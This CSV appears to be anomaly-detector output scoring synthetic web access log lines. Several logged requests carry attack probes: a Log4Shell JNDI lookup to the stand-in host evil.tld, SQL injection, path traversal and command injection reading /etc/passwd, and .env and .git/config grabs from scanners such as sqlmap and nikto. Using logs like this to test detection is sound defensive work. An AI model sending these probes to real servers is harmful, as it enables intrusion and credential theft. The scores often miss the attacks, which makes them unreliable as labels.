score_content,score_session,score_fused,line
72.07317352294922,,72.07317352294922,{"remote_addr": "112.32.217.161", "time_local": "11/Jan/2025:09:00:08 -0700", "request": "OPTIONS / HTTP/2", "status": 200, "body_bytes_sent": 9036, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
72.45516204833984,,72.45516204833984,{"remote_addr": "196.196.129.142", "time_local": "11/Jan/2025:09:00:08 -0700", "request": "OPTIONS /cgi-bin/test.cgi HTTP/2", "status": 301, "body_bytes_sent": 14422, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
30.913219451904297,,30.913219451904297,{"remote_addr": "169.45.210.229", "time_local": "11/Jan/2025:09:00:09 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 2895, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
5.852059841156006,,5.852059841156006,{"remote_addr": "248.130.66.97", "time_local": "11/Jan/2025:09:00:10 -0700", "request": "GET /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 8937, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.3017961978912354,,2.3017961978912354,{"remote_addr": "185.57.219.142", "time_local": "11/Jan/2025:09:00:11 -0700", "request": "GET /assets/app.css HTTP/2", "status": 302, "body_bytes_sent": 10388, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
1.636654019355774,,1.636654019355774,{"remote_addr": "239.139.226.183", "time_local": "11/Jan/2025:09:00:12 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 9360, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30.9702091217041,,30.9702091217041,{"remote_addr": "98.157.147.67", "time_local": "11/Jan/2025:09:00:13 -0700", "request": "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 4767, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
70.52728271484375,,70.52728271484375,{"remote_addr": "19.231.59.58", "time_local": "11/Jan/2025:09:00:14 -0700", "request": "OPTIONS /.git/config HTTP/2", "status": 200, "body_bytes_sent": 17320, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
50.687744140625,,50.687744140625,{"remote_addr": "140.152.115.152", "time_local": "11/Jan/2025:09:00:14 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 16360, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
5.824662685394287,,5.824662685394287,{"remote_addr": "23.14.97.145", "time_local": "11/Jan/2025:09:00:14 -0700", "request": "GET /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 6917, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
5.812040328979492,,5.812040328979492,{"remote_addr": "190.132.180.109", "time_local": "11/Jan/2025:09:00:15 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 3159, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
76.0723648071289,,76.0723648071289,{"remote_addr": "117.254.9.27", "time_local": "11/Jan/2025:09:00:16 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 16184, "http_referer": "-", "http_user_agent": "dirb/2.22"}
0.2485358864068985,,0.2485358864068985,{"remote_addr": "118.61.190.217", "time_local": "11/Jan/2025:09:00:16 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 11051, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
46.504398345947266,,46.504398345947266,{"remote_addr": "120.114.183.51", "time_local": "11/Jan/2025:09:00:17 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 2701, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
16.93045425415039,,16.93045425415039,{"remote_addr": "171.235.162.203", "time_local": "11/Jan/2025:09:00:18 -0700", "request": "PUT /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 12193, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
8.570531845092773,,8.570531845092773,{"remote_addr": "30.130.241.15", "time_local": "11/Jan/2025:09:00:18 -0700", "request": "POST /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 10140, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
46.37931442260742,,46.37931442260742,{"remote_addr": "178.5.5.164", "time_local": "11/Jan/2025:09:00:19 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 6157, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
3.683607578277588,,3.683607578277588,{"remote_addr": "94.197.246.201", "time_local": "11/Jan/2025:09:00:20 -0700", "request": "GET /profile HTTP/2", "status": 302, "body_bytes_sent": 7225, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
56.12021255493164,,56.12021255493164,{"remote_addr": "136.243.61.144", "time_local": "11/Jan/2025:09:00:21 -0700", "request": "HEAD /wp-login.php HTTP/2", "status": 400, "body_bytes_sent": 465, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
102.83735656738281,,102.83735656738281,{"remote_addr": "248.65.188.195", "time_local": "11/Jan/2025:09:00:21 -0700", "request": "TRACE /contact HTTP/2", "status": 200, "body_bytes_sent": 4901, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
75.98699188232422,,75.98699188232422,{"remote_addr": "194.136.81.21", "time_local": "11/Jan/2025:09:00:22 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 5647, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.3132050037384033,,2.3132050037384033,{"remote_addr": "173.33.104.27", "time_local": "11/Jan/2025:09:00:23 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 709, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
50.642005920410156,,50.642005920410156,{"remote_addr": "73.73.102.83", "time_local": "11/Jan/2025:09:00:23 -0700", "request": "HEAD /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 5703, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
16.981388092041016,,16.981388092041016,{"remote_addr": "251.132.164.48", "time_local": "11/Jan/2025:09:00:24 -0700", "request": "GET /search?q=ssd HTTP/2", "status": 403, "body_bytes_sent": 373, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
8.552084922790527,,8.552084922790527,{"remote_addr": "232.148.156.53", "time_local": "11/Jan/2025:09:00:24 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 10691, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
30.929485321044922,,30.929485321044922,{"remote_addr": "107.232.239.212", "time_local": "11/Jan/2025:09:00:25 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 7850, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
30.94732666015625,,30.94732666015625,{"remote_addr": "246.211.245.94", "time_local": "11/Jan/2025:09:00:26 -0700", "request": "DELETE /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 7551, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
76.03675079345703,,76.03675079345703,{"remote_addr": "131.191.13.248", "time_local": "11/Jan/2025:09:00:26 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 15117, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
71.84347534179688,,71.84347534179688,{"remote_addr": "3.19.247.160", "time_local": "11/Jan/2025:09:00:26 -0700", "request": "OPTIONS /profile HTTP/2", "status": 200, "body_bytes_sent": 14930, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
48.61891174316406,,48.61891174316406,{"remote_addr": "159.146.220.148", "time_local": "11/Jan/2025:09:00:27 -0700", "request": "HEAD /about HTTP/2", "status": 304, "body_bytes_sent": 405, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
36.38331985473633,,36.38331985473633,{"remote_addr": "195.74.150.80", "time_local": "11/Jan/2025:09:00:28 -0700", "request": "DELETE /cgi-bin/test.cgi HTTP/2", "status": 403, "body_bytes_sent": 1274, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
0.23831647634506226,,0.23831647634506226,{"remote_addr": "221.94.13.196", "time_local": "11/Jan/2025:09:00:29 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 8039, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
50.65945816040039,,50.65945816040039,{"remote_addr": "110.202.137.45", "time_local": "11/Jan/2025:09:00:30 -0700", "request": "HEAD /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 7324, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
42.94731903076172,,42.94731903076172,{"remote_addr": "135.22.221.189", "time_local": "11/Jan/2025:09:00:30 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 429, "body_bytes_sent": 21, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
8.633927345275879,,8.633927345275879,{"remote_addr": "223.128.105.15", "time_local": "11/Jan/2025:09:00:31 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 16337, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
568.1417236328125,,568.1417236328125,{"remote_addr": "159.164.148.146", "time_local": "11/Jan/2025:09:00:32 -0700", "request": "GET /.git/config HTTP/2", "status": 502, "body_bytes_sent": 1311, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
30.984580993652344,,30.984580993652344,{"remote_addr": "48.180.192.247", "time_local": "11/Jan/2025:09:00:33 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 15683, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
73.9622802734375,,73.9622802734375,{"remote_addr": "31.76.45.245", "time_local": "11/Jan/2025:09:00:34 -0700", "request": "OPTIONS /login HTTP/2", "status": 302, "body_bytes_sent": 14667, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
0.515514612197876,,0.515514612197876,{"remote_addr": "178.7.254.133", "time_local": "11/Jan/2025:09:00:34 -0700", "request": "GET /.env HTTP/2", "status": 200, "body_bytes_sent": 7703, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
71.77886199951172,,71.77886199951172,{"remote_addr": "167.222.67.42", "time_local": "11/Jan/2025:09:00:35 -0700", "request": "OPTIONS /dashboard HTTP/2", "status": 200, "body_bytes_sent": 12828, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.24296914041042328,,0.24296914041042328,{"remote_addr": "152.60.219.133", "time_local": "11/Jan/2025:09:00:35 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 3031, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.6781402826309204,,1.6781402826309204,{"remote_addr": "3.164.104.196", "time_local": "11/Jan/2025:09:00:36 -0700", "request": "GET /about HTTP/2", "status": 200, "body_bytes_sent": 2081, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
46.488765716552734,,46.488765716552734,{"remote_addr": "236.174.50.244", "time_local": "11/Jan/2025:09:00:37 -0700", "request": "HEAD /logout HTTP/2", "status": 200, "body_bytes_sent": 7987, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
50.644596099853516,,50.644596099853516,{"remote_addr": "1.69.139.109", "time_local": "11/Jan/2025:09:00:37 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 2536, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
3.0298447608947754,,3.0298447608947754,{"remote_addr": "192.28.201.90", "time_local": "11/Jan/2025:09:00:39 -0700", "request": "POST /index.html HTTP/2", "status": 201, "body_bytes_sent": 1520, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
0.223334401845932,,0.223334401845932,{"remote_addr": "241.134.154.158", "time_local": "11/Jan/2025:09:00:40 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 3797, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
12.767592430114746,,12.767592430114746,{"remote_addr": "54.70.233.131", "time_local": "11/Jan/2025:09:00:41 -0700", "request": "PUT /login HTTP/2", "status": 200, "body_bytes_sent": 2549, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
0.22292460501194,,0.22292460501194,{"remote_addr": "48.34.101.220", "time_local": "11/Jan/2025:09:00:42 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 1439, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
12.634119033813477,,12.634119033813477,{"remote_addr": "129.58.100.212", "time_local": "11/Jan/2025:09:00:42 -0700", "request": "GET /dashboard HTTP/2", "status": 403, "body_bytes_sent": 1002, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
1.6467914581298828,,1.6467914581298828,{"remote_addr": "4.239.7.73", "time_local": "11/Jan/2025:09:00:43 -0700", "request": "GET /logout HTTP/2", "status": 200, "body_bytes_sent": 1604, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
45.044681549072266,,45.044681549072266,{"remote_addr": "127.12.132.203", "time_local": "11/Jan/2025:09:00:43 -0700", "request": "HEAD /../../etc/passwd HTTP/2", "status": 204, "body_bytes_sent": 16769, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
12.657105445861816,,12.657105445861816,{"remote_addr": "254.98.31.71", "time_local": "11/Jan/2025:09:00:44 -0700", "request": "PUT /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 14907, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
76.03253936767578,,76.03253936767578,{"remote_addr": "193.233.89.23", "time_local": "11/Jan/2025:09:00:45 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 3867, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
87.09123229980469,,87.09123229980469,{"remote_addr": "142.57.140.245", "time_local": "11/Jan/2025:09:00:46 -0700", "request": "OPTIONS /search?q=phone HTTP/2", "status": 403, "body_bytes_sent": 1380, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
57.62359619140625,,57.62359619140625,{"remote_addr": "21.135.173.44", "time_local": "11/Jan/2025:09:00:47 -0700", "request": "HEAD /about HTTP/2", "status": 401, "body_bytes_sent": 123, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
15.170690536499023,,15.170690536499023,{"remote_addr": "130.76.206.191", "time_local": "11/Jan/2025:09:00:48 -0700", "request": "POST /server-status HTTP/2", "status": 400, "body_bytes_sent": 1134, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
7.905642986297607,,7.905642986297607,{"remote_addr": "43.135.218.100", "time_local": "11/Jan/2025:09:00:48 -0700", "request": "GET /search?q=camera HTTP/2", "status": 304, "body_bytes_sent": 7749, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
16.842668533325195,,16.842668533325195,{"remote_addr": "212.129.23.178", "time_local": "11/Jan/2025:09:00:49 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 400, "body_bytes_sent": 250, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
73.83222961425781,,73.83222961425781,{"remote_addr": "183.125.176.42", "time_local": "11/Jan/2025:09:00:50 -0700", "request": "OPTIONS /api/products HTTP/2", "status": 302, "body_bytes_sent": 16715, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
16.924453735351562,,16.924453735351562,{"remote_addr": "56.17.25.182", "time_local": "11/Jan/2025:09:00:50 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 10325, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
106.9930419921875,,106.9930419921875,{"remote_addr": "164.210.110.24", "time_local": "11/Jan/2025:09:00:51 -0700", "request": "TRACE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 15888, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
45.160789489746094,,45.160789489746094,{"remote_addr": "130.241.94.7", "time_local": "11/Jan/2025:09:00:51 -0700", "request": "HEAD /index.html HTTP/2", "status": 200, "body_bytes_sent": 7991, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
618.572021484375,,618.572021484375,{"remote_addr": "208.29.197.239", "time_local": "11/Jan/2025:09:00:52 -0700", "request": "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 503, "body_bytes_sent": 119, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
101.50790405273438,,101.50790405273438,{"remote_addr": "62.68.157.80", "time_local": "11/Jan/2025:09:00:53 -0700", "request": "TRACE /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 10011, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
12.614742279052734,,12.614742279052734,{"remote_addr": "232.1.149.96", "time_local": "11/Jan/2025:09:00:54 -0700", "request": "GET /contact HTTP/2", "status": 400, "body_bytes_sent": 1327, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
113.9565200805664,,113.9565200805664,{"remote_addr": "103.7.151.168", "time_local": "11/Jan/2025:09:00:54 -0700", "request": "TRACE /logout HTTP/2", "status": 403, "body_bytes_sent": 560, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
0.5431471467018127,,0.5431471467018127,{"remote_addr": "79.82.77.94", "time_local": "11/Jan/2025:09:00:56 -0700", "request": "GET /.env HTTP/2", "status": 200, "body_bytes_sent": 16526, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
5.854252815246582,,5.854252815246582,{"remote_addr": "37.126.156.64", "time_local": "11/Jan/2025:09:00:56 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 5806, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
1.7257710695266724,,1.7257710695266724,{"remote_addr": "19.66.229.237", "time_local": "11/Jan/2025:09:00:57 -0700", "request": "GET /admin HTTP/2", "status": 200, "body_bytes_sent": 294, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
16.83707618713379,,16.83707618713379,{"remote_addr": "141.238.71.215", "time_local": "11/Jan/2025:09:00:58 -0700", "request": "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 5566, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
12.628265380859375,,12.628265380859375,{"remote_addr": "15.220.37.131", "time_local": "11/Jan/2025:09:00:59 -0700", "request": "PUT /api/products HTTP/2", "status": 204, "body_bytes_sent": 4429, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
674.8868408203125,,674.8868408203125,{"remote_addr": "161.234.120.82", "time_local": "11/Jan/2025:09:00:59 -0700", "request": "TRACE /search?q=phone HTTP/2", "status": 500, "body_bytes_sent": 262, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
8.526126861572266,,8.526126861572266,{"remote_addr": "18.186.68.172", "time_local": "11/Jan/2025:09:00:59 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 3099, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
38.54826736450195,,38.54826736450195,{"remote_addr": "229.232.94.121", "time_local": "11/Jan/2025:09:01:00 -0700", "request": "DELETE /logout HTTP/2", "status": 429, "body_bytes_sent": 597, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
6.471420764923096,,6.471420764923096,{"remote_addr": "130.249.42.223", "time_local": "11/Jan/2025:09:01:00 -0700", "request": "POST /login HTTP/2", "status": 304, "body_bytes_sent": 3048, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
11.273918151855469,,11.273918151855469,{"remote_addr": "127.189.170.139", "time_local": "11/Jan/2025:09:01:01 -0700", "request": "PUT /../../etc/passwd HTTP/2", "status": 204, "body_bytes_sent": 6233, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
1.5532151460647583,,1.5532151460647583,{"remote_addr": "116.40.241.67", "time_local": "11/Jan/2025:09:01:02 -0700", "request": "GET /dashboard HTTP/2", "status": 201, "body_bytes_sent": 2471, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
114.30707550048828,,114.30707550048828,{"remote_addr": "161.192.103.111", "time_local": "11/Jan/2025:09:01:02 -0700", "request": "TRACE / HTTP/2", "status": 404, "body_bytes_sent": 76, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
6.478114128112793,,6.478114128112793,{"remote_addr": "213.32.43.176", "time_local": "11/Jan/2025:09:01:03 -0700", "request": "POST /login HTTP/2", "status": 301, "body_bytes_sent": 15437, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
71.8744888305664,,71.8744888305664,{"remote_addr": "94.185.161.5", "time_local": "11/Jan/2025:09:01:04 -0700", "request": "OPTIONS /login HTTP/2", "status": 200, "body_bytes_sent": 4901, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
1.6698658466339111,,1.6698658466339111,{"remote_addr": "198.81.26.8", "time_local": "11/Jan/2025:09:01:05 -0700", "request": "GET /logout HTTP/2", "status": 204, "body_bytes_sent": 12761, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
46.69010925292969,,46.69010925292969,{"remote_addr": "15.57.88.182", "time_local": "11/Jan/2025:09:01:05 -0700", "request": "HEAD / HTTP/2", "status": 200, "body_bytes_sent": 3500, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
102.92752075195312,,102.92752075195312,{"remote_addr": "203.31.249.190", "time_local": "11/Jan/2025:09:01:06 -0700", "request": "TRACE /about HTTP/2", "status": 200, "body_bytes_sent": 12619, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
